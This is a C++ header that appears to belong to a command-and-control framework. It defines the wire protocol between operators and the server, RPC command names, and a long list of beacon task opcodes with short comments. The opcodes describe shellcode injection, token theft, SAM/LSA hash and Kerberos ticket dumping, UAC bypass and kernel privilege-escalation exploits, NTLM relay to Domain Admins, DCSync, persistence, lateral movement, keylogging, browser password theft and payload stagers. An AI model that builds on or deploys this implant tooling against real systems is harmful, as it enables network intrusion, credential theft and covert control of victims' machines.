#pragma once

#include "bytes.hpp"

#include <cstdint>
#include <optional>
#include <string>
#include <vector>

namespace co2h::proto {

// Operator <-> server message types. Keep values stable.
enum class MsgType : std::uint8_t {
    Hello      = 0x01, // client -> server: version, client name
    HelloAck   = 0x02, // server -> client: version, server id, nonce
    Auth       = 0x03, // client -> server: username, password (bcrypt hash)
    AuthAck    = 0x04, // server -> client: ok/err, operator id
    Subscribe  = 0x05, // client -> server: event categories
    Event      = 0x06, // server -> client: async event
    Command    = 0x07, // client -> server: RPC command
    Response   = 0x08, // server -> client: RPC response
    Ping       = 0x09,
    Pong       = 0x0A,
    Bye        = 0x0B,
};

// Wire frame: [u32 be length][u8 type][bytes payload]
// Length covers [type][payload] only.
constexpr std::uint32_t kMaxFrameLen = 16u * 1024u * 1024u;

struct Frame {
    MsgType type{};
    Bytes   payload;
};

// Event categories operators can subscribe to.
enum class EventCategory : std::uint8_t {
    Sessions    = 0x01,
    Listeners   = 0x02,
    Tasks       = 0x03,
    Logs        = 0x04,
    Chat        = 0x05,
    Credentials = 0x06,
    Audit       = 0x07,  // operator command audit (admin-only broadcast)
};

// RPC command names (payload is msgpack map keyed as below).
namespace cmd {
    constexpr const char* kListSessions   = "sessions.list";
    constexpr const char* kListListeners  = "listeners.list";
    constexpr const char* kAddListener    = "listeners.add";
    constexpr const char* kDelListener    = "listeners.del";
    constexpr const char* kTaskBeacon     = "beacon.task";
    constexpr const char* kInteractBeacon = "beacon.interact";
    constexpr const char* kGenArtifact    = "artifact.gen";
    constexpr const char* kUploadProfile  = "profile.upload";
    constexpr const char* kChatSend       = "chat.send";
    constexpr const char* kCredsList      = "creds.list";
    constexpr const char* kCredsAdd       = "creds.add";
    constexpr const char* kCredsDel       = "creds.del";
    constexpr const char* kListOperators  = "operators.list";
    constexpr const char* kAddOperator    = "operators.add";
    constexpr const char* kDelOperator    = "operators.del";
    constexpr const char* kSetOperatorPwd = "operators.set_password";
}

// Beacon transport kinds.
enum class TransportKind : std::uint8_t {
    Https = 1,
    Smb   = 2,
    Tcp   = 3,
    Dns   = 4,
};

// Beacon task opcodes (server -> beacon).
enum class TaskOp : std::uint16_t {
    Noop       = 0,
    Sleep      = 1,   // {u32 ms, u8 jitter_pct}
    Exit       = 2,
    Kill       = 3,   // TerminateProcess немедленно
    Shell      = 10,  // {utf8 command}
    Run        = 11,  // {utf8 image, utf8 args}
    Ps         = 12,
    Upload     = 20,  // {utf8 dst_path, bytes data}
    Download   = 21,  // {utf8 src_path}
    Ls         = 22,  // {utf8 path}
    Cd         = 23,  // {utf8 path}
    Pwd        = 24,
    Rm         = 25,
    Cp         = 26,
    Mv         = 27,
    Inject     = 40,  // {u32 pid, bytes shellcode}
    Spawn      = 41,  // {utf8 spawnto, bytes shellcode}
    Bof        = 50,  // {bytes coff, utf8 entry, bytes args}
    ExeAsm     = 51,  // {bytes pe_assembly, utf8 args}
    IShell     = 60,  // {utf8 input} — start/feed/stop interactive cmd.exe; empty = stop
    TcpPivot     = 90, // KV: {host utf8, port u32} — open raw TCP pivot to teamserver
    TokenSteal   = 80, // {utf8 decimal pid}
    TokenMake    = 81, // {utf8 "DOMAIN\\user password"}
    TokenRev     = 82,
    TokenGetuid  = 83,
    PrivAll      = 84, // {} — enable all privileges on current thread/process token
    InjectThread = 100, // KV: {pid u32, sc bytes}
    InjectApc    = 101, // KV: {pid u32, sc bytes}
    SpawnTo      = 103, // KV: {spawn_to utf8 (опц.), sc bytes}
    ModStomp     = 104, // KV: {dll utf8 (опц.), sc bytes}
    Migrate      = 105, // KV: {pid u32} — reflective self-inject + ExitProcess
    InjectDll    = 106, // KV: {dll bytes, args utf8 (опц.), spawn_to utf8 (опц.)} — fork & run reflective DLL
    HashDump     = 110, // {} — dump SAM/LSA secret hashes
    TicketList   = 111, // {} — list Kerberos tickets in current session
    TicketDump   = 112, // {luid u64 (опц.), service utf8 (опц.)} — extract ticket .kirbi
    TicketUse    = 113, // {kirbi bytes} — pass-the-ticket (KerbSubmitTicketMessage)
    TicketPurge  = 114, // {} — purge tickets
    PrivescAdmin  = 120, // {} — UAC bypass via fodhelper ms-settings hijack
    PrivescSystem = 121, // {} — SYSTEM via winlogon token theft
    PrivescPlasma = 122, // {} — SYSTEM via CVE-2020-17103 CfAbortOperation race
    LdapAddDA     = 130, // {dc_ip, user_dn, group_dn, listen_port} — NTLM relay → LDAP → Domain Admins
    LdapRbcd      = 131, // {dc_ip, beacon_ip, coerce_ip, target_dn, attacker_sid, listen_port} — NTLM relay → LDAP → RBCD
    DcSync        = 132, // {domain utf8, user utf8} — MS-DRSR EXOP_REPL_SECRETS → NT hash
    Kerberoast    = 133, // {domain utf8 (opt)} — LDAP enum SPNs + LSA TGS → $krb5tgs$ hashes
    Screenshot    = 134, // {} — снимок экрана → BMP через RESP_FILE
    PersistReg    = 135, // {name utf8, path utf8} — HKCU\...\Run
    PersistTask   = 136, // {name utf8, path utf8} — Scheduled Task (ITaskService)
    PersistWmi    = 137, // {name utf8, script utf8, interval uint32} — WMI event subscription
    PsExecCmd     = 140, // {target utf8, cmd utf8} — SCM service → remote cmd → stdout
    WmiExec       = 141, // {target utf8, cmd utf8} — WMI Win32_Process::Create → remote cmd → stdout
    DcomExec      = 142, // {target utf8, cmd utf8} — DCOM MMC20.Application → remote cmd → ADMIN$
    WinRmExec     = 143, // {target utf8, cmd utf8} — WinRM WS-Management shell → remote cmd → ADMIN$
    PortFwd       = 144, // {action utf8, lport u32, rhost utf8, rport u32} — local TCP forward
    PortScan      = 148, // {target utf8, ports utf8 (opt)} — TCP connect scan
    Keylogger     = 149, // {cmd utf8: start|dump|stop} — WH_KEYBOARD_LL hook
    RportfwdOpen  = 145, // {conn_id u64, rhost utf8, rport u32} — подключиться к rhost:rport
    RportfwdData  = 146, // {conn_id u64, data bytes} — отправить данные
    RportfwdClose = 147, // {conn_id u64} — закрыть соединение
    SocksOpen     = 160, // {conn_id u64, host utf8, port u32} — open SOCKS target connection
    SocksData     = 161, // {conn_id u64, data bytes}           — relay data to target
    SocksClose    = 162, // {conn_id u64}                       — close target connection
    RelayStart    = 170, // {port u32} — beacon opens relay TCP listener for child beacons
    RelayStop     = 171, // {port u32} — beacon closes relay listener
    RelayResp     = 172, // {child_uid u32, data bytes} — raw TCP frame for child socket
    StagerLnk     = 180, // {url utf8 \0 out_path utf8} — create .lnk stager on target
    StagerHta     = 181, // {url utf8 \0 out_path utf8} — create .hta stager on target
    StagerVbs     = 182, // {url utf8 \0 out_path utf8} — create .vbs stager on target
    StagerWsf     = 183, // {url utf8 \0 out_path utf8} — create .wsf stager on target
    StagerIso     = 184, // {url utf8 \0 out_path utf8} — create .iso stager via IMAPI2
    StagerChm     = 185, // {url utf8 \0 out_path utf8} — create .chm stager via hhc.exe
    AdcsEnum      = 190, // {domain utf8 (opt)} — ESC1-16 ADCS misconfiguration scan
    EdgeCreds     = 191, // {} — dump cleartext passwords from Edge process memory

    // Linux beacon commands (OP_CAT=28 .. OP_KILL=36 in beacon-linux/core/beacon.h)
    Cat           = 28,  // {utf8 path} — вывести содержимое файла
    Mkdir         = 29,  // {utf8 path}
    Chmod         = 30,  // {utf8 mode \0 utf8 path}
    Env           = 31,  // {} — переменные окружения
    Whoami        = 32,  // {} — текущий пользователь
    Id            = 33,  // {} — uid/gid/groups
    Hostname      = 34,  // {} — имя хоста
    Ifconfig      = 35,  // {} — сетевые интерфейсы
    KillProc      = 36,  // {utf8 pid} — SIGKILL процесса (Linux)
    PrivescRoot   = 37,  // {utf8 method (opt)} — dirty pipe CVE-2022-0847 (Linux)
    DirtyFrag     = 38,  // {utf8 "esp"|"rxrpc"|""} — xfrm/ESP + rxrpc/rxkad LPE (Linux)
};

// Beacon transport envelope message types (TCP/SMB raw transports).
namespace tport {
    constexpr std::uint8_t kCheckin    = 1;
    constexpr std::uint8_t kPoll       = 2;
    constexpr std::uint8_t kTasks      = 3;
    constexpr std::uint8_t kOutput     = 4;
    constexpr std::uint8_t kAck        = 5;
    constexpr std::uint32_t kMaxLen    = 16u * 1024u * 1024u;
}

// Beacon response opcodes (beacon -> server).
enum class RespOp : std::uint16_t {
    CheckIn  = 0,   // initial registration
    Ack      = 1,
    Output   = 2,   // utf8/bytes blob produced by task
    File     = 3,   // bytes content of a downloaded file
    Error    = 4,
    PsList   = 5,
    LsList   = 6,
};

}
